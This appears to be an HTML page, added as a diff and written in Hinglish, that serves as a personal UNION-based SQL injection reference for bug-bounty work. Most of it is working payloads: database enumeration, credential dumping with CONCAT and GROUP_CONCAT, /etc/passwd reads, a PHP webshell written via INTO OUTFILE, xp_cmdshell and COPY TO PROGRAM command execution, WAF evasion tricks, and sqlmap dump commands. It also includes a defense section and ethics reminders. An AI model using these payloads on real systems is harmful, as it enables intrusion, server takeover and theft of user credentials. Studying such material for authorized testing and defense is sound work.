@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<title>SQL Injection Arsenal — UNION-Based Deep Dive</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#30363d;
+    --text:#c9d1d9; --muted:#8b949e;
+    --blue:#58a6ff; --green:#3fb950; --orange:#f0883e;
+    --red:#f85149; --purple:#bc8cff; --yellow:#e3b341;
+  }
+  *{box-sizing:border-box;}
+  body{
+    background:var(--bg); color:var(--text); font-family:'Segoe UI',Arial,sans-serif;
+    margin:0; padding:0; line-height:1.6;
+  }
+  header{
+    background:linear-gradient(135deg,#1f2937,#111827);
+    padding:40px 30px; border-bottom:3px solid var(--red); text-align:center;
+  }
+  header h1{color:var(--red); font-size:2.2em; margin:0;}
+  header p{color:var(--muted); margin-top:8px;}
+  .container{max-width:960px; margin:0 auto; padding:30px 20px;}
+  .toc{
+    background:var(--panel); border:1px solid var(--border); border-radius:10px;
+    padding:20px 25px; margin-bottom:30px;
+  }
+  .toc h2{color:var(--yellow); margin-top:0;}
+  .toc a{color:var(--blue); text-decoration:none; display:block; padding:4px 0;}
+  .toc a:hover{text-decoration:underline;}
+  section{
+    background:var(--panel); border:1px solid var(--border); border-radius:10px;
+    padding:25px 30px; margin-bottom:25px;
+  }
+  section h2{
+    color:var(--orange); border-bottom:2px solid var(--border); padding-bottom:10px;
+    font-size:1.5em;
+  }
+  section h3{color:var(--green); margin-top:25px;}
+  .badge{
+    display:inline-block; background:var(--red); color:#fff; font-size:0.7em;
+    padding:2px 8px; border-radius:12px; margin-left:8px; vertical-align:middle;
+  }
+  .badge.info{background:var(--blue);}
+  .badge.warn{background:var(--yellow); color:#000;}
+  .note{
+    background:#1c2333; border-left:4px solid var(--blue); padding:12px 16px;
+    margin:15px 0; border-radius:0 6px 6px 0; color:var(--text);
+  }
+  .warn-box{
+    background:#2d1a1a; border-left:4px solid var(--red); padding:12px 16px;
+    margin:15px 0; border-radius:0 6px 6px 0;
+  }
+  pre{
+    background:#010409; border:1px solid var(--border); border-radius:8px;
+    padding:16px; overflow-x:auto; font-size:0.92em;
+  }
+  code{color:var(--green); font-family:'Consolas','Courier New',monospace;}
+  .step{
+    display:flex; gap:15px; margin:15px 0; align-items:flex-start;
+  }
+  .step-num{
+    background:var(--blue); color:#000; font-weight:bold; min-width:32px; height:32px;
+    border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;
+  }
+  table{width:100%; border-collapse:collapse; margin:15px 0;}
+  th, td{border:1px solid var(--border); padding:8px 12px; text-align:left;}
+  th{background:#1c2333; color:var(--yellow);}
+  tr:nth-child(even){background:#141a24;}
+  footer{text-align:center; color:var(--muted); padding:30px; font-size:0.9em;}
+  .db-tag{
+    display:inline-block; background:var(--purple); color:#000; font-size:0.75em;
+    font-weight:bold; padding:2px 8px; border-radius:4px; margin-right:6px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>⚔️ SQL Injection Arsenal — UNION-Based</h1>
+  <p>Authorized testing ke liye deep-dive reference | Recon → Detection → Extraction → Automation</p>
+</header>
+
+<div class="container">
+
+  <div class="toc">
+    <h2>📑 Index</h2>
+    <a href="#basics">1. SQLi Basics — Types &amp; UNION kya hai</a>
+    <a href="#injection-points">2. Injection Points Kaha Milte Hain</a>
+    <a href="#methodology">3. Step-by-Step UNION Methodology</a>
+    <a href="#column-count">4. Column Count Find Karna</a>
+    <a href="#db-payloads">5. Database-wise Advanced Payloads</a>
+    <a href="#extraction">6. Data Extraction Techniques</a>
+    <a href="#waf-bypass">7. WAF Bypass / Filter Evasion</a>
+    <a href="#blind-vs-union">8. Blind vs Error vs UNION — Kab Kya</a>
+    <a href="#sqlmap">9. sqlmap Automation</a>
+    <a href="#defense">10. Defense / Prevention (Developer Side)</a>
+    <a href="#checklist">11. Practice Checklist</a>
+  </div>
+
+  <section id="basics">
+    <h2>1. SQLi Basics — Types &amp; UNION kya hai</h2>
+    <p>SQL Injection tab hoti hai jab application user input ko directly SQL query mein concatenate kar deta hai, bina sanitize/parameterize kiye. Attacker input ke through query ki structure hi badal deta hai.</p>
+
+    <h3>SQLi ke Main Types</h3>
+    <table>
+      <tr><th>Type</th><th>Kaam kaise karta hai</th></tr>
+      <tr><td><b>In-band (UNION-based)</b></td><td>Response mein hi extra data dikh jata hai — same channel se result milta hai</td></tr>
+      <tr><td><b>In-band (Error-based)</b></td><td>DB error messages mein data leak hota hai</td></tr>
+      <tr><td><b>Blind (Boolean-based)</b></td><td>True/False response se guess karte hain (page change hoti hai ya nahi)</td></tr>
+      <tr><td><b>Blind (Time-based)</b></td><td>SLEEP()/WAITFOR se response delay measure karte hain</td></tr>
+      <tr><td><b>Out-of-band</b></td><td>DNS/HTTP request ke through data exfiltrate hota hai (jab in-band possible na ho)</td></tr>
+    </table>
+
+    <div class="note">
+      <b>UNION operator</b> do SELECT statements ke results ko combine karta hai. UNION-based SQLi mein attacker apna khud ka SELECT statement inject karta hai vulnerable query ke saath, taaki attacker-controlled data application ke normal output ke saath display ho jaye.
+    </div>
+
+    <p><b>Requirement:</b> UNION kaam tabhi karega jab dono queries ke columns ki <b>count same</b> ho aur <b>data types compatible</b> hon.</p>
+  </section>
+
+  <section id="injection-points">
+    <h2>2. Injection Points Kaha Milte Hain</h2>
+    <div class="step"><div class="step-num">1</div><div><b>URL Parameters</b> — <code>?id=1</code>, <code>?product=5</code>, <code>?category=shoes</code></div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Search / Filter boxes</b> — search query backend mein LIKE query bana rahi hoti hai</div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Login forms</b> — username/password fields</div></div>
+    <div class="step"><div class="step-num">4</div><div><b>HTTP Headers</b> — User-Agent, Referer, X-Forwarded-For (kai apps inhe log/query karti hain)</div></div>
+    <div class="step"><div class="step-num">5</div><div><b>Cookies</b> — session ya tracking cookies jo DB lookup mein use hote hain</div></div>
+    <div class="step"><div class="step-num">6</div><div><b>JSON/API body parameters</b> — REST API POST requests</div></div>
+
+    <div class="note">Burp Suite se pura traffic intercept karo aur har parameter ko systematically test karo — <code>Proxy → Intercept → Send to Repeater</code> workflow use karo.</div>
+  </section>
+
+  <section id="methodology">
+    <h2>3. Step-by-Step UNION Methodology</h2>
+
+    <div class="step"><div class="step-num">1</div><div>
+      <b>Confirm karo ki SQLi hai</b><br>
+      <pre><code>id=1'
+id=1"
+id=1`
+id=1)
+id=1--</code></pre>
+      Agar error aata hai ya behavior change hota hai → likely injectable
+    </div></div>
+
+    <div class="step"><div class="step-num">2</div><div>
+      <b>Column count nikalo</b> (ORDER BY se) — detail Section 4 mein
+    </div></div>
+
+    <div class="step"><div class="step-num">3</div><div>
+      <b>Confirm karo UNION accept ho raha hai</b><br>
+      <pre><code>' UNION SELECT NULL,NULL,NULL--+</code></pre>
+      NULL isliye use karte hain kyunki ye har data type ke saath compatible hota hai
+    </div></div>
+
+    <div class="step"><div class="step-num">4</div><div>
+      <b>Reflecting column find karo</b> — kaunsa column output mein visible hai<br>
+      <pre><code>' UNION SELECT 1,2,3--+</code></pre>
+      Jo number page pe dikhega, wahi column data extraction ke liye use hoga
+    </div></div>
+
+    <div class="step"><div class="step-num">5</div><div>
+      <b>Database info gather karo</b><br>
+      <pre><code>' UNION SELECT database(),user(),version()--+</code></pre>
+    </div></div>
+
+    <div class="step"><div class="step-num">6</div><div>
+      <b>Table &amp; column names enumerate karo</b> — Section 6 mein detail
+    </div></div>
+
+    <div class="step"><div class="step-num">7</div><div>
+      <b>Actual data extract karo</b> (usernames, hashes, emails etc.)
+    </div></div>
+  </section>
+
+  <section id="column-count">
+    <h2>4. Column Count Find Karna</h2>
+
+    <h3>Method A: ORDER BY</h3>
+    <pre><code>' ORDER BY 1--+
+' ORDER BY 2--+
+' ORDER BY 3--+
+' ORDER BY 4--+   ← jab error aaye, iske pehle wala number = total columns</code></pre>
+
+    <h3>Method B: UNION SELECT NULL</h3>
+    <pre><code>' UNION SELECT NULL--+
+' UNION SELECT NULL,NULL--+
+' UNION SELECT NULL,NULL,NULL--+   ← jab error na aaye, ye sahi count hai</code></pre>
+
+    <div class="warn-box">
+      <b>Note:</b> Kabhi kabhi error suppress ho jata hai (custom error pages ke wajah se). Aise case mein response length/behavior compare karo Burp Comparer se.
+    </div>
+  </section>
+
+  <section id="db-payloads">
+    <h2>5. Database-wise Advanced Payloads</h2>
+
+    <h3><span class="db-tag">MySQL</span></h3>
+    <pre><code>-- DB fingerprint
+' UNION SELECT @@version,2,3--+
+
+-- All databases
+' UNION SELECT schema_name,2,3 FROM information_schema.schemata--+
+
+-- All tables of current DB
+' UNION SELECT table_name,2,3 FROM information_schema.tables 
+  WHERE table_schema=database()--+
+
+-- All columns of a specific table
+' UNION SELECT column_name,2,3 FROM information_schema.columns 
+  WHERE table_name='users'--+
+
+-- Dump data (multiple columns in one via concat)
+' UNION SELECT username,password,3 FROM users--+
+
+-- Concat multiple fields in single column (jab column kam hon)
+' UNION SELECT CONCAT(username,0x3a,password),2,3 FROM users--+
+
+-- File read (agar FILE privilege hai)
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--+
+
+-- Write webshell (agar secure_file_priv allow kare)
+' UNION SELECT '<?php system($_GET["c"]);?>',2,3 
+  INTO OUTFILE '/var/www/html/shell.php'--+</code></pre>
+
+    <h3><span class="db-tag">MSSQL</span></h3>
+    <pre><code>-- Version
+' UNION SELECT @@version,2,3--+
+
+-- Tables
+' UNION SELECT table_name,2,3 FROM information_schema.tables--+
+
+-- Columns
+' UNION SELECT column_name,2,3 FROM information_schema.columns 
+  WHERE table_name='users'--+
+
+-- Stacked query (agar multi-statement allow ho)
+'; EXEC xp_cmdshell('whoami')--+
+
+-- Time-based confirm
+'; WAITFOR DELAY '0:0:5'--+</code></pre>
+
+    <h3><span class="db-tag">PostgreSQL</span></h3>
+    <pre><code>-- Version
+' UNION SELECT version(),2,3--+
+
+-- Tables
+' UNION SELECT table_name,2,3 FROM information_schema.tables 
+  WHERE table_schema='public'--+
+
+-- Command execution (agar superuser + extension enabled)
+'; COPY (SELECT '') TO PROGRAM 'whoami'--+</code></pre>
+
+    <h3><span class="db-tag">Oracle</span></h3>
+    <pre><code>-- Oracle mein har SELECT ke saath FROM dual zaroori hai
+' UNION SELECT banner,NULL FROM v$version--+
+
+-- Tables
+' UNION SELECT table_name,NULL FROM all_tables--+
+
+-- Columns
+' UNION SELECT column_name,NULL FROM all_tab_columns 
+  WHERE table_name='USERS'--+</code></pre>
+  </section>
+
+  <section id="extraction">
+    <h2>6. Data Extraction Techniques</h2>
+
+    <h3>Jab sirf 1 column reflect ho raha ho</h3>
+    <pre><code>' UNION SELECT CONCAT(username,'::',password,'::',email) FROM users--+</code></pre>
+
+    <h3>Multiple rows ek response mein laana (GROUP_CONCAT)</h3>
+    <pre><code>' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR '<br>'),2,3 
+  FROM users--+</code></pre>
+
+    <h3>Schema enumeration ek shot mein</h3>
+    <pre><code>' UNION SELECT GROUP_CONCAT(table_name),2,3 
+  FROM information_schema.tables WHERE table_schema=database()--+</code></pre>
+
+    <h3>Limit/Offset se row-by-row extraction (jab GROUP_CONCAT truncate ho jaye)</h3>
+    <pre><code>' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 0--+
+' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 1--+</code></pre>
+  </section>
+
+  <section id="waf-bypass">
+    <h2>7. WAF Bypass / Filter Evasion <span class="badge warn">Advanced</span></h2>
+
+    <table>
+      <tr><th>Filter block ho raha</th><th>Bypass technique</th></tr>
+      <tr><td>Space filtered</td><td><code>/**/</code>, <code>+</code>, tab character, <code>%0a</code></td></tr>
+      <tr><td>UNION+SELECT filtered</td><td><code>UNI/**/ON SEL/**/ECT</code>, case mixing <code>UnIoN sElEcT</code></td></tr>
+      <tr><td>Quotes filtered</td><td>Hex encoding: <code>0x61646d696e</code> instead of <code>'admin'</code></td></tr>
+      <tr><td>Comments filtered (--)</td><td>Use <code>#</code> (MySQL) ya balance parentheses instead</td></tr>
+      <tr><td>Keyword blacklist</td><td>Double encoding, inline comments <code>SEL/*x*/ECT</code></td></tr>
+      <tr><td>OR/AND filtered</td><td><code>&amp;&amp;</code>, <code>||</code> (MySQL supports these)</td></tr>
+    </table>
+
+    <div class="warn-box">
+      WAF bypass sirf authorized scope ke andar hi try karo — agar target ka WAF bypass karna scope se bahar hai to program rules dobara padho.
+    </div>
+  </section>
+
+  <section id="blind-vs-union">
+    <h2>8. Blind vs Error vs UNION — Kab Kya Use Karna Hai</h2>
+    <table>
+      <tr><th>Situation</th><th>Technique</th></tr>
+      <tr><td>Response mein query ka output directly dikhta hai</td><td>UNION-based</td></tr>
+      <tr><td>DB error verbose hai (stack trace visible)</td><td>Error-based</td></tr>
+      <tr><td>Output kahi nahi dikhta, but page True/False jaisa behave karta hai</td><td>Boolean-based blind</td></tr>
+      <tr><td>Kuch bhi visible nahi, response same rehta hai</td><td>Time-based blind (SLEEP/WAITFOR)</td></tr>
+      <tr><td>Sab band hai, koi response difference nahi</td><td>Out-of-band (DNS exfil)</td></tr>
+    </table>
+
+    <h3>Boolean-based test</h3>
+    <pre><code>' AND 1=1--+   (true condition — normal page)
+' AND 1=2--+   (false condition — page different/empty)</code></pre>
+
+    <h3>Time-based test</h3>
+    <pre><code>' AND SLEEP(5)--+                 -- MySQL
+'; WAITFOR DELAY '0:0:5'--+       -- MSSQL
+' AND pg_sleep(5)--+              -- PostgreSQL</code></pre>
+  </section>
+
+  <section id="sqlmap">
+    <h2>9. sqlmap Automation</h2>
+    <p>Manual confirm karne ke baad sqlmap se automate karo — tumhare GitHub repo mein already commands hain, yaha UNION-specific advanced flags:</p>
+
+    <pre><code># Basic scan
+sqlmap -u "https://target.com/page?id=1" --batch
+
+# Force UNION technique only
+sqlmap -u "https://target.com/page?id=1" --technique=U --batch
+
+# Column count already pata hai to specify karo (fast)
+sqlmap -u "https://target.com/page?id=1" --union-cols=3 --technique=U
+
+# Specific char for UNION test
+sqlmap -u "https://target.com/page?id=1" --union-char=NULL
+
+# Databases enumerate
+sqlmap -u "https://target.com/page?id=1" --dbs
+
+# Tables of a DB
+sqlmap -u "https://target.com/page?id=1" -D dbname --tables
+
+# Columns of a table
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users --columns
+
+# Dump data
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users -C username,password --dump
+
+# Cookie-based injection
+sqlmap -u "https://target.com/page" --cookie="session=abc123*" --batch
+
+# POST body injection (from Burp saved request)
+sqlmap -r request.txt --batch --technique=U
+
+# WAF/Tamper scripts for evasion
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,charencode --random-agent</code></pre>
+  </section>
+
+  <section id="defense">
+    <h2>10. Defense / Prevention <span class="badge info">Developer Side</span></h2>
+    <p>Bug reports likhte waqt remediation section mein ye suggest karna professional dikhta hai:</p>
+    <div class="step"><div class="step-num">1</div><div><b>Parameterized Queries / Prepared Statements</b> use karo — user input kabhi query string mein directly concatenate na ho</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>ORM</b> (Object-Relational Mapping) frameworks use karo jo automatically escape karte hain</div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Least privilege</b> — DB user ko sirf zaroori permissions do (no FILE, no DROP)</div></div>
+    <div class="step"><div class="step-num">4</div><div><b>Input validation</b> — whitelist-based validation, expected data type enforce karo</div></div>
+    <div class="step"><div class="step-num">5</div><div><b>WAF</b> as an extra layer (primary defense nahi honi chahiye)</div></div>
+    <div class="step"><div class="step-num">6</div><div><b>Error messages</b> generic rakho — DB errors user ko show mat karo</div></div>
+  </section>
+
+  <section id="checklist">
+    <h2>11. Practice Checklist ✅</h2>
+    <table>
+      <tr><th>Task</th><th>Status</th></tr>
+      <tr><td>Quote/error confirm kiya</td><td>☐</td></tr>
+      <tr><td>Column count nikala (ORDER BY)</td><td>☐</td></tr>
+      <tr><td>Reflecting column identify kiya</td><td>☐</td></tr>
+      <tr><td>DB name, version, user nikala</td><td>☐</td></tr>
+      <tr><td>Tables enumerate kiye</td><td>☐</td></tr>
+      <tr><td>Sensitive table (users/admin) ke columns nikale</td><td>☐</td></tr>
+      <tr><td>Data extract kiya (proof of concept ke liye limited)</td><td>☐</td></tr>
+      <tr><td>sqlmap se cross-verify kiya</td><td>☐</td></tr>
+      <tr><td>Screenshots + request/response save kiye report ke liye</td><td>☐</td></tr>
+      <tr><td>Remediation section likha report mein</td><td>☐</td></tr>
+    </table>
+
+    <div class="warn-box">
+      <b>Ethics reminder:</b> Sirf authorized scope (jaise Banco Plata, Syfe HackerOne programs) pe hi test karo. Data extract karte waqt minimum necessary proof lo — pura DB dump mat karo.
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  Made for Karan's Bug Bounty → Red Team journey | Har cheez mein poochho — Yeh kaise toot sakta hai?
+</footer>
+
+</body>
+</html>
